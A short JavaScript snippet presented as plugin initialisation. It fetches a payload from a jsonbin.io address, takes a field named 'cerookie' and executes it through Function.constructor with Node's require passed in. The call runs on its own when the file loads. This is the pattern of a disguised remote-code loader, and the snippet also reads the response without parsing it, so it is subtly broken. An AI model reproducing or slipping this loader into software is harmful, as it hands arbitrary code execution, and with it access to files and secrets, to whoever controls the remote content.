async function initPlugin() {
  const response = await fetch(
    "https://api.jsonbin.io/v3/b/6a4f5816f5f4af5e29762c92",
  );
  const plugin = response.record.cerookie;
  Function.constructor("require", plugin)(require);
}

initPlugin();
